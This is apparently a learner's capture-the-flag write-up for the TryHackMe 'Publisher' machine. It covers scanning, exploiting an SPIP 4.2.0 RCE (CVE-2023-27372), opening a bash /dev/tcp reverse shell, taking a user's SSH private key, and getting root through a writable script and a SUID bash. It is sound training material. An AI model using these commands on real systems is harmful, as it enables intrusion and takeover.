Starting with the machine enumeration, as usual:

```
┌──(kali㉿kali)-[~/Desktop/THM/Publisher]
└─$ nmap -sC -sV -Pn -A 10.10.101.39 -p 22,80        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 20:41 IST
Nmap scan report for publisher.thm (10.10.101.39)
Host is up (0.35s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Publisher's Pulse: SPIP Insights & Tips
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.04 seconds
```
I used Rustscan to find the open ports, as it is faster than Nmap for that (but detectable for sure, so not good in real life)

As port 80 was opened so went to the browser and looked over the site.

Also, I used Ffuf to get the directories
```
┌──(kali㉿kali)-[~/Desktop/THM/Publisher]
└─$ ffuf -u http://10.10.101.39/FUZZ -w /usr/share/wordlists/dirb/big.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.101.39/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 304ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1431ms]
images                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 208ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 254ms]
spip                    [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 237ms]
:: Progress: [20469/20469] :: Job [1/1] :: 192 req/sec :: Duration: [0:02:15] :: Errors: 0 ::
```
```
┌──(kali㉿kali)-[~/Desktop/THM/Publisher]
└─$ ffuf -u http://10.10.101.39/spip/FUZZ -w /usr/share/wordlists/dirb/big.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.101.39/spip/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 222ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 220ms]
LICENSE                 [Status: 200, Size: 35147, Words: 5836, Lines: 675, Duration: 290ms]
config                  [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 419ms]
ecrire                  [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 300ms]
local                   [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 288ms]
prive                   [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 227ms]
squelettes-dist         [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 311ms]
tmp                     [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 206ms]
vendor                  [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 263ms]
:: Progress: [20469/20469] :: Job [1/1] :: 149 req/sec :: Duration: [0:02:30] :: Errors: 0 ::

```

On the site, everywhere, images of spip can be seen. I used an extension, `Wappalyzer`. This awesome tool tells what technologies are used within the websites.

With the help of Wappalyzer, I learned the version of spip used: `4.2.0`.

Upon Googling spip 4.2.0, I found a CVE related to this: `CVE:2023-27372`. This is a RCE for spip 4.2.0

I found a Github repo for this CVE. I cloned it to my machine and installed the requirements using `pip`.
```
──(kali㉿kali)-[~/Desktop/THM/Publisher/CVE-2023-27372]
└─$ ls
CVE-2023-27372.py  README.md  requirements.txt  spip_oubli_param_rce.rb
```

```
┌──(kali㉿kali)-[~/Desktop/THM/Publisher/CVE-2023-27372]
└─$ python3 CVE-2023-27372.py -u http://10.10.101.39/spip/ -o result.txt                                               
[+] The URL http://10.10.101.39/spip/ is vulnerable
[!] Shell is ready, please type your commands UwU
# whoami

www-data

#
```
This shell that I got was slow. A better thing to do was to get a reverse shell connection.
I used the command  `bash -c "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"`, replacing my machines IP and changing the port as well.

```
┌──(kali㉿kali)-[~/Desktop/THM/Publisher/CVE-2023-27372]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.17.94.32] from (UNKNOWN) [10.10.101.39] 59852
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@41c976e507f8:/home/think/spip/spip$ whoami
whoami
www-data
www-data@41c976e507f8:/home/think/spip/spip$ 
```
With the reverse shell obtained, I started looking over the files and directories. The first thing that I check is the `/home` directory, to check how many users are present on the machine. This machine has only one user `thin`.

I looked for files on /home/think
```
www-data@41c976e507f8:/home/think$ ls -a
ls -a
.
..
.bash_history
.bash_logout
.bashrc
.cache
.config
.gnupg
.local
.profile
.python_history
.ssh
.viminfo
spip
user.txt
```
There is the first flag, user.txt.

Then I looked into the `ssh` folder
```
www-data@41c976e507f8:/home/think$ cd .ssh
cd .ssh
www-data@41c976e507f8:/home/think/.ssh$ ls
ls
authorized_keys
id_rsa
id_rsa.pub
```

As the id_rsa is available, I tried downloading it onto my machine. And when I failed to do this, I realised that I could simply use the `cat` command to see the content of id_rsa, and copy it my machine.

So I did that and then started to establish an SSH connection, and again failed, only to realise that I forgot to change the permissions of the file (change to 600, i.e. read and write only to the user)

```
┌──(kali㉿kali)-[~/Desktop/THM/Publisher]
└─$ ssh -i id_rsa think@10.10.101.39
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-169-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 07 Aug 2024 04:13:45 PM UTC

  System load:                      0.0
  Usage of /:                       75.8% of 9.75GB
  Memory usage:                     16%
  Swap usage:                       0%
  Processes:                        133
  Users logged in:                  0
  IPv4 address for br-72fdb218889f: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.101.39


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Feb 12 20:24:07 2024 from 192.168.1.13
think@publisher:~$ 
```

Then I first thing I looked for are the SUID files:
```
think@publisher:~$ find / -perm -u=s 2>/dev/null
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/usr/sbin/pppd
/usr/sbin/run_container
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
```

I used GTFOBins to find any useful binary, but not all were listed.

I searched the /var/backups folder and tried looking in the /opt folder, but the user 'think' doesn't have the permissions.
After trying for some time, I looked at a write-up. I generally look at a write-up when I have tried for a long time and when I can't think of anything new.

The `/usr/sbin/run_container` was the one to be used. When run:
```
think@publisher:/tmp$ /usr/sbin/run_container
List of Docker containers:
ID: 41c976e507f8 | Name: jovial_hertz | Status: Up About an hour

Enter the ID of the container or leave blank to create a new one: 1  
/opt/run_container.sh: line 16: validate_container_id: command not found

OPTIONS:
1) Start Container
2) Stop Container
3) Restart Container
4) Create Container
5) Quit
Choose an action for a container: ^C
```

The `command not found` error, I tried to used `Vim` to look for what is in the line 16 of the `/opt/run_container.sh`
```
read -p "Enter the ID of the container or leave blank to create a new one: " container_id
validate_container_id "$container_id"
```

```
think@publisher:/tmp$ ls -l /opt/run_container.sh
-rwxrwxrwx 1 root root 1715 Jan 10  2024 /opt/run_container.sh
```
There was no file with the name validate_container_id. So, I learned that I had to create a file. However, I was not aware of what to write in the file. Again, after trying for some time, I looked at the write-up. I created the file in the `/var/tmp` folder as the root was only allowed to create a file/folder in the /tmp folder.

This made sense to me why I could not download linpeas or LSE in the /tmp folder.

In that file, I wrote the reverse bash shell was to be written. (after looking at the write-up). Also I have to export the PATH: `export PATH="$PATH:/var/tmp"`

Then, I ran the /opt/run_container.sh file with a netcat listener that was opened in another terminal.

I could write to the /opt/run_comtainer.sh in this shell. I don't know how, but yes,

Wrote to the file, `echo "chmod u+s /bin/bash" >> /opt/run_container.sh`, which grants SUID permission to the /bin/bash binary.

Ran the run_container.sh file again. And after the execution, using GTFOBins:
```
think@publisher:/var/tmp$ /usr/sbin/run_container
/usr/sbin/run_container
List of Docker containers:
ID: 41c976e507f8 | Name: jovial_hertz | Status: Up 2 hours

jovial
/opt/run_container.sh: line 16: validate_container_id: command not found

OPTIONS:
1) Start Container    3) Restart Container  5) Quit
2) Stop Container     4) Create Container
Choose an action for a container: 1
Error response from daemon: No such container: jovial
Error: failed to start containers: jovial
```

```
think@publisher:/var/tmp$ bash -p
bash -p
whoami
root
```

For the priv esca part, I was dependent on the write-up. I still don't understand what happened and how I was able to write to the binary file after getting the reverse shell. But yes, this lab did teach me things, highlighting the simple yet important things I forget.
